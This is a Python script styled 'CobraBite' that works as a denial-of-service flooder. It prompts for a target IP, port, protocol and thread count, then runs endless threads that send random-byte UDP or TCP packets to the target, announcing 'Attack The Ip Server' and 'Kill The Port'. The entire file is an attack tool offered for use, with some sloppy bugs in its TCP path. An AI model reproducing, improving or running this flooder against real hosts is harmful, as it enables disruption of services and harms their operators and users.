import random
import socket
import threading
import os
import sys
import time

os.system("clear")
print("\033[93m")
print(""" \033[92m

░█████╗░░█████╗░██████╗░██████╗░░█████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║░░╚═╝██║░░██║██████╦╝██████╔╝███████║
██║░░██╗██║░░██║██╔══██╗██╔══██╗██╔══██║
╚█████╔╝╚█████╔╝██████╦╝██║░░██║██║░░██║
░╚════╝░░╚════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝""")
print("\033[93m")


ip = str(input("====> \033[93m Enter Host/Ip Target:"))
port = int(input(" \033[93m====> \033[93m Enter Port Target:"))
choice = str(input(" \033[93m====> \033[93m Select Methods UDP OR TCP:"))
times = int(input(" \033[93m====> \033[93m Packets :"))
threads = int(input("\033[93m====> \033[93m Threads:"))

os.system("clear")
def run():
	data = random._urandom(1025)
	i = random.choice(("\033[1m [@] CobraBite ====>]","\033[1m [@] CobraBite ====>]","\033[1m [@] CobraBite====>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91mAttack The Ip Server:\033[0m%s\033[91m Kill The Port:\033[0m%s"%(ip,port))
		except:
			print("\033[92m Connection Time Out")

def run2():
	data = random._urandom(16)
	i = random.choice(("\033[1m [@] CobraBite ====>]","\033[1m [@] CobraBite ====>]","\033[1m [@] CobraBite ====>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91mAttack The Ip Server:\033[0m%s\033[91m Kill The Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m Connection Time Out")

def tcp():
    data = random._urandom(1024)
    while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(time):
                    s.send(data)
                print('\033[95m CobraBite')
            except:
                s.close

for udp in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()   
 
for y in range(threads):
  if choice == 'TCP':
    th = threading.Thread(target = tcp)
    th.start() 
   
